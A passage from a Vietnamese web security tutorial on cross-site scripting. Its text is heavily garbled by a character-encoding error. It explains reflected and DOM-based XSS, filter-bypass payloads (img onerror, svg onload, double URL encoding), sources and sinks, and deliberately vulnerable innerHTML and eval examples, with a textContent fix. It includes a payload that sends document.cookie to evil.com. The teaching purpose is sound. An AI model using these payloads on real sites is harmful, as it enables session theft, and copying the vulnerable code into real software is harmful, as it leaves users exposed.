    var value = pair.length > 1 ? decodeURIComponent(pair[1]) : "";
    params[key] = value;
  }
  return params;
}

// â‘¢ REQUEST BÃŒNH THÆ¯á»œNG:
var normalHtml = handleSearchRequest("?q=laptop");
console.log("--- BÃŒNH THÆ¯á»œNG ---");
console.log(normalHtml);
// â†’ <h2>Káº¿t quáº£ cho: laptop</h2>
// â†’ AN TOÃ€N!

// â‘£ REQUEST Táº¤N CÃ”NG:
var attackHtml = handleSearchRequest('?q=<script>alert("XSS")</script>');
console.log("--- Táº¤N CÃ”NG ---");
console.log(attackHtml);
// â†’ <h2>Káº¿t quáº£ cho: <script>alert("XSS")</script></h2>
// â†’ BROWSER CHáº Y SCRIPT!

// â‘¤ Táº¤N CÃ”NG TINH VI HÆ N â€” THOÃT KHá»I ATTRIBUTE:
var attackHtml2 = handleSearchRequest(
  '?q=" onfocus="alert(document.cookie)" autofocus="',
);
console.log("--- Táº¤N CÃ”NG ATTRIBUTE ---");
console.log(attackHtml2);
// â†’ <input name="q" value="" onfocus="alert(document.cookie)"
//   autofocus="">
// â†’ KHÃ”NG Cáº¦N <script>! DÃ¹ng event handler!
```

```
  REFLECTED XSS â€” LUá»’NG Táº¤N CÃ”NG:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 1: Hacker táº¡o URL chá»©a payload:                 â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  https://shop.com/search?q=                      â”‚  â”‚
  â”‚  â”‚    <script>                                      â”‚  â”‚
  â”‚  â”‚      new Image().src='https://evil.com/s?c='     â”‚  â”‚
  â”‚  â”‚        +document.cookie                          â”‚  â”‚
  â”‚  â”‚    </script>                                     â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 2: Hacker Gá»¬I link cho náº¡n nhÃ¢n:                â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Via email: "Xem sáº£n pháº©m giáº£m giÃ¡!"           â”‚  â”‚
  â”‚  â”‚  Via chat: "Click vÃ o link nÃ y!"                 â”‚  â”‚
  â”‚  â”‚  Via web: Link trong forum, comment!             â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âš  ThÆ°á»ng dÃ¹ng URL shortener Ä‘á»ƒ áº©N payload!    â”‚  â”‚
  â”‚  â”‚  bit.ly/abc123 â†’ shop.com/search?q=<script>... â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 3: Náº¡n nhÃ¢n click!                               â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  Click!   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”             â”‚  â”‚
  â”‚  â”‚  â”‚ Náº¡n nhÃ¢nâ”‚ â”€â”€â”€â”€â”€â”€â”€â”€ â†’â”‚  Server  â”‚             â”‚  â”‚
  â”‚  â”‚  â”‚         â”‚           â”‚ shop.com â”‚             â”‚  â”‚
  â”‚  â”‚  â”‚         â”‚  â† â”€â”€â”€â”€ â”€â”‚ Tráº£ HTML â”‚             â”‚  â”‚
  â”‚  â”‚  â”‚ Browser â”‚  HTML cÃ³  â”‚ chá»©a     â”‚             â”‚  â”‚
  â”‚  â”‚  â”‚ CHáº Y    â”‚  <script> â”‚ payload! â”‚             â”‚  â”‚
  â”‚  â”‚  â”‚ script! â”‚           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â”‚  â”‚
  â”‚  â”‚  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜                                     â”‚  â”‚
  â”‚  â”‚       â”‚ Cookie gá»­i Ä‘i!                           â”‚  â”‚
  â”‚  â”‚       â–¼                                          â”‚  â”‚
  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                    â”‚  â”‚
  â”‚  â”‚  â”‚ evil.com â”‚ â† Nháº­n cookie!                    â”‚  â”‚
  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                    â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  KHÃC Vá»šI STORED XSS:                                  â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Stored: payload LÆ¯U trong DB â†’ Táº¤T Cáº¢ bá»‹!    â”‚  â”‚
  â”‚  â”‚  Reflected: payload trong URL â†’ Cáº¦N user CLICK!â”‚  â”‚
  â”‚  â”‚  â†’ Reflected Ã­t nguy hiá»ƒm hÆ¡n (cáº§n social eng) â”‚  â”‚
  â”‚  â”‚  â†’ NHÆ¯NG váº«n Ráº¤T nguy hiá»ƒm!                   â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 4.3. Encoded Payload â€” VÆ°á»£t Qua Filter CÆ¡ Báº£n!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ENCODED PAYLOAD â€” BYPASS BASIC FILTERS!
// Hacker mÃ£ hÃ³a payload Ä‘á»ƒ vÆ°á»£t qua filter!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  URL ENCODING:
// <script>alert('XSS')</script>
// â†’ %3Cscript%3Ealert('XSS')%3C/script%3E
// â†’ Browser Tá»° DECODE khi nháº­n!

// â‘¡ DOUBLE ENCODING:
// < â†’ %3C â†’ %253C
// Server decode 1 láº§n: %253C â†’ %3C
// Browser decode láº§n 2: %3C â†’ <
// â†’ Filter tháº¥y %253C â†’ khÃ´ng nháº­n ra lÃ  <script>!

// â‘¢ HTML ENTITY ENCODING:
// <script> â†’ &#60;script&#62;
// â†’ NHÆ¯NG bÃªn trong attribute thÃ¬ browser DECODE!
// <img src="x" onerror="&#97;lert('XSS')">
// â†’ Browser decode &#97; â†’ 'a' â†’ alert('XSS')!

// â‘£ JAVASCRIPT ENCODING:
// alert('XSS') â†’ \u0061lert('XSS')
// â†’ JavaScript engine decode \u0061 â†’ 'a'!

// â‘¤ Tá»° VIáº¾T â€” MÃ£ hÃ³a/giáº£i mÃ£ URL:
function urlEncode(str) {
  var result = "";
  for (var i = 0; i < str.length; i++) {
    var char = str.charAt(i);
    var code = str.charCodeAt(i);

    // KÃ½ tá»± an toÃ n: A-Z, a-z, 0-9, -, _, ., ~
    if (
      (code >= 65 && code <= 90) || // A-Z
      (code >= 97 && code <= 122) || // a-z
      (code >= 48 && code <= 57) || // 0-9
      char === "-" ||
      char === "_" ||
      char === "." ||
      char === "~"
    ) {
      result += char;
    } else {
      // Chuyá»ƒn thÃ nh %XX:
      var hex = code.toString(16).toUpperCase();
      if (hex.length === 1) hex = "0" + hex;
      result += "%" + hex;
    }
  }
  return result;
}

function urlDecode(str) {
  var result = "";
  var i = 0;
  while (i < str.length) {
    if (str.charAt(i) === "%" && i + 2 < str.length) {
      var hex = str.substring(i + 1, i + 3);
      var code = parseInt(hex, 16);
      if (!isNaN(code)) {
        result += String.fromCharCode(code);
        i += 3;
        continue;
      }
    }
    result += str.charAt(i);
    i++;
  }
  return result;
}

// THá»¬ NGHIá»†M:
var payload = '<script>alert("XSS")</script>';
var encoded = urlEncode(payload);
console.log("Encoded:", encoded);
// â†’ %3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E

var decoded = urlDecode(encoded);
console.log("Decoded:", decoded);
// â†’ <script>alert("XSS")</script>

console.log("Giá»‘ng nhau?", payload === decoded);
// â†’ true!
```

```
  ENCODING â€” Táº I SAO HACKER DÃ™NG?
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  FILTER CÆ  Báº¢N Cá»¦A SERVER:                            â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  if (input.includes('<script>')) {                â”‚  â”‚
  â”‚  â”‚    return 'BLOCKED!';  // â† CHá»ˆ TÃŒM chuá»—i!    â”‚  â”‚
  â”‚  â”‚  }                                               â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  HACKER BYPASS:                                         â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â‘  <SCRIPT> (viáº¿t HOA)                          â”‚  â”‚
  â”‚  â”‚  â‘¡ <ScRiPt> (mixed case)                        â”‚  â”‚
  â”‚  â”‚  â‘¢ <scr<script>ipt> (nested)                    â”‚  â”‚
  â”‚  â”‚  â‘£ <img src=x onerror=alert(1)> (no script!)    â”‚  â”‚
  â”‚  â”‚  â‘¤ <svg onload=alert(1)> (SVG event!)           â”‚  â”‚
  â”‚  â”‚  â‘¥ <body onload=alert(1)> (body event!)         â”‚  â”‚
  â”‚  â”‚  â‘¦ <a href="javascript:alert(1)"> (protocol!)   â”‚  â”‚
  â”‚  â”‚  â‘§ %3Cscript%3E (URL encoded!)                  â”‚  â”‚
  â”‚  â”‚  â‘¨ &#60;script&#62; (HTML entity!)              â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âš  BLACKLIST APPROACH Sáº¼ LUÃ”N THáº¤T Báº I!        â”‚  â”‚
  â”‚  â”‚  â†’ CÃ³ QUÃ NHIá»€U cÃ¡ch bypass!                   â”‚  â”‚
  â”‚  â”‚  â†’ Giáº£i phÃ¡p Ä‘Ãºng: ESCAPE OUTPUT!               â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§5. DOM-based XSS â€” Táº¥n CÃ´ng HoÃ n ToÃ n PhÃ­a Client!

### 5.1. DOM-based XSS KhÃ¡c GÃ¬?

```
  DOM-BASED XSS â€” KHÃ”NG QUA SERVER!
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  KHÃC BIá»†T QUAN TRá»ŒNG:                                â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Stored/Reflected XSS:                           â”‚  â”‚
  â”‚  â”‚  Payload â†’ SERVER â†’ HTML response â†’ Browser     â”‚  â”‚
  â”‚  â”‚  â†’ Server THAM GIA vÃ o quÃ¡ trÃ¬nh!               â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  DOM-based XSS:                                  â”‚  â”‚
  â”‚  â”‚  Payload â†’ URL â†’ JavaScript â†’ DOM               â”‚  â”‚
  â”‚  â”‚  â†’ Server KHÃ”NG THAM GIA!                       â”‚  â”‚
  â”‚  â”‚  â†’ JavaScript phÃ­a CLIENT tá»± xá»­ lÃ½!             â”‚  â”‚
  â”‚  â”‚  â†’ Server KHÃ”NG BAO GIá»œ tháº¥y payload!           â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  SÆ  Äá»’ SO SÃNH:                                       â”‚
  â”‚                                                        â”‚
  â”‚  REFLECTED XSS:                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  URL+payload  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”  HTML+payload   â”‚
  â”‚  â”‚ Browser â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚ Server â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’   â”‚
  â”‚  â”‚         â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚        â”‚  Response       â”‚
  â”‚  â”‚ CHáº Y!   â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                           â”‚
  â”‚                                                        â”‚
  â”‚  DOM-BASED XSS:                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  URL+payload                             â”‚
  â”‚  â”‚ Browser â”‚ â”€â”€â”€â”€â”€â”                                   â”‚
  â”‚  â”‚         â”‚      â”‚  JavaScript Äá»ŒC URL              â”‚
  â”‚  â”‚         â”‚      â”‚  â†’ ChÃ¨n vÃ o DOM!                 â”‚
  â”‚  â”‚ CHáº Y!   â”‚ â†â”€â”€â”€â”€â”˜                                   â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                           â”‚
  â”‚  â†‘ KHÃ”NG QUA SERVER!                                  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 5.2. Sources & Sinks â€” Nguá»“n VÃ  ÄÃ­ch!

```
  SOURCES & SINKS â€” KHÃI NIá»†M QUAN TRá»ŒNG:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  SOURCE = NÆ¡i láº¥y dá»¯ liá»‡u tá»« USER (cÃ³ thá»ƒ bá»‹ Ä‘áº§u Ä‘á»™c)â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ document.URL                                  â”‚  â”‚
  â”‚  â”‚  â†’ document.documentURI                          â”‚  â”‚
  â”‚  â”‚  â†’ document.referrer                             â”‚  â”‚
  â”‚  â”‚  â†’ location.href                                 â”‚  â”‚
  â”‚  â”‚  â†’ location.search                               â”‚  â”‚
  â”‚  â”‚  â†’ location.hash                                 â”‚  â”‚
  â”‚  â”‚  â†’ window.name                                   â”‚  â”‚
  â”‚  â”‚  â†’ document.cookie (Ä‘á»c)                        â”‚  â”‚
  â”‚  â”‚  â†’ Web Storage (localStorage, sessionStorage)    â”‚  â”‚
  â”‚  â”‚  â†’ postMessage data                              â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  SINK = NÆ¡i chÃ¨n dá»¯ liá»‡u vÃ o DOM (nguy hiá»ƒm!)        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  âš  NGUY HIá»‚M CAO:                              â”‚  â”‚
  â”‚  â”‚  â†’ element.innerHTML = userInput â† XSS!        â”‚  â”‚
  â”‚  â”‚  â†’ document.write(userInput)     â† XSS!        â”‚  â”‚
  â”‚  â”‚  â†’ eval(userInput)              â† XSS!         â”‚  â”‚
  â”‚  â”‚  â†’ setTimeout(userInput)        â† XSS!         â”‚  â”‚
  â”‚  â”‚  â†’ setInterval(userInput)       â† XSS!         â”‚  â”‚
  â”‚  â”‚  â†’ new Function(userInput)      â† XSS!         â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âš  NGUY HIá»‚M TRUNG BÃŒNH:                       â”‚  â”‚
  â”‚  â”‚  â†’ element.outerHTML                             â”‚  â”‚
  â”‚  â”‚  â†’ element.insertAdjacentHTML()                  â”‚  â”‚
  â”‚  â”‚  â†’ document.writeln()                            â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âœ… AN TOÃ€N:                                     â”‚  â”‚
  â”‚  â”‚  â†’ element.textContent = userInput â† AN TOÃ€N!  â”‚  â”‚
  â”‚  â”‚  â†’ element.innerText = userInput   â† AN TOÃ€N!  â”‚  â”‚
  â”‚  â”‚  â†’ element.setAttribute('class')  â† AN TOÃ€N!  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  XSS Xáº¢Y RA KHI: SOURCE â”€â”€(khÃ´ng lá»c)â”€â”€â†’ SINK!       â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 5.3. Tá»± Viáº¿t â€” MÃ´ Phá»ng DOM-based XSS!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MÃ” PHá»NG DOM-BASED XSS â€” JAVASCRIPT PHÃA CLIENT!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  VÃ Dá»¤ 1 â€” innerHTML + location.hash:
// URL: https://app.com/page#<img src=x onerror=alert('XSS')>

function vulnerableHashHandler() {
  // SOURCE: location.hash
  var hash = location.hash.substring(1); // Bá» dáº¥u #

  // SINK: innerHTML â€” NGUY HIá»‚M!
  document.getElementById("content").innerHTML =
    "<h2>Báº¡n Ä‘ang xem: " + hash + "</h2>";

  // â†’ Náº¿u hash = <img src=x onerror=alert('XSS')>
  // â†’ innerHTML chÃ¨n <img> vÃ o DOM!
  // â†’ onerror CHáº Y! â†’ alert('XSS')!
}

// â‘¡ VÃ Dá»¤ 2 â€” document.write + location.search:
// URL: https://app.com/page?name=<script>alert('XSS')</script>

function vulnerableGreeting() {
  // SOURCE: location.search
  var params = location.search; // ?name=...
  var name = params.split("name=")[1] || "Guest";

  // SINK: document.write â€” NGUY HIá»‚M!
  document.write("<h1>Xin chÃ o, " + decodeURIComponent(name) + "!</h1>");
}

// â‘¢ VÃ Dá»¤ 3 â€” eval() + URL parameter:
// URL: https://app.com/calc?expr=alert('XSS')

function vulnerableCalculator() {
  var expr = location.search.split("expr=")[1] || "0";

  // SINK: eval â€” Cá»°C Ká»² NGUY HIá»‚M!
  var result = eval(decodeURIComponent(expr));
  // â†’ Náº¿u expr = alert('XSS') â†’ CHáº Y alert!
  // â†’ Náº¿u expr = fetch('evil.com'...) â†’ Gá»¬I request!

  document.getElementById("result").textContent = result;
}

// â‘£ VÃ Dá»¤ 4 â€” jQuery .html() (tÆ°Æ¡ng Ä‘Æ°Æ¡ng innerHTML):
// URL: https://app.com/#<img src=x onerror=alert(1)>

function vulnerablejQuery() {
  // jQuery .html() = innerHTML = NGUY HIá»‚M!
  // $('#content').html(location.hash.substring(1));
  // â†’ TÆ°Æ¡ng Ä‘Æ°Æ¡ng:
  document.getElementById("content").innerHTML = location.hash.substring(1);
}

// â‘¤ Báº¢N FIX AN TOÃ€N â€” DÃ¹ng textContent thay innerHTML:
function safeHashHandler() {
  var hash = location.hash.substring(1);

  // âœ… textContent â€” AN TOÃ€N! KhÃ´ng parse HTML!
  document.getElementById("content").textContent = "Báº¡n Ä‘ang xem: " + hash;

  // â†’ <img src=x onerror=alert('XSS')>
  //   Ä‘Æ°á»£c HIá»‚N THá»Š nhÆ° TEXT, khÃ´ng pháº£i HTML!
  // â†’ User tháº¥y: "Báº¡n Ä‘ang xem: <img src=x...>"
  // â†’ KHÃ”NG cháº¡y onerror!
}
```

```
  DOM-BASED XSS â€” LUá»’NG Táº¤N CÃ”NG:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  URL: app.com/page#<img src=x onerror=alert(1)>       â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  BÆ¯á»šC 1: Náº¡n nhÃ¢n click URL chá»©a payload       â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  BÆ¯á»šC 2: Browser táº£i trang app.com/page         â”‚  â”‚
  â”‚  â”‚  â†’ Server tráº£ HTML bÃ¬nh thÆ°á»ng                  â”‚  â”‚
  â”‚  â”‚  â†’ Server KHÃ”NG tháº¥y hash (# khÃ´ng gá»­i lÃªn!)   â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  BÆ¯á»šC 3: JavaScript cháº¡y:                        â”‚  â”‚
  â”‚  â”‚  var hash = location.hash.substring(1);          â”‚  â”‚
  â”‚  â”‚  â†’ hash = "<img src=x onerror=alert(1)>"       â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  BÆ¯á»šC 4: ChÃ¨n vÃ o DOM:                           â”‚  â”‚
  â”‚  â”‚  element.innerHTML = hash;                       â”‚  â”‚
  â”‚  â”‚  â†’ Browser parse HTML!                          â”‚  â”‚
  â”‚  â”‚  â†’ Táº¡o <img> element!                           â”‚  â”‚
  â”‚  â”‚  â†’ src=x â†’ FAIL â†’ trigger onerror!            â”‚  â”‚
  â”‚  â”‚  â†’ alert(1) CHáº Y! â† XSS!                      â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  âš  QUAN TRá»ŒNG:                                         â”‚
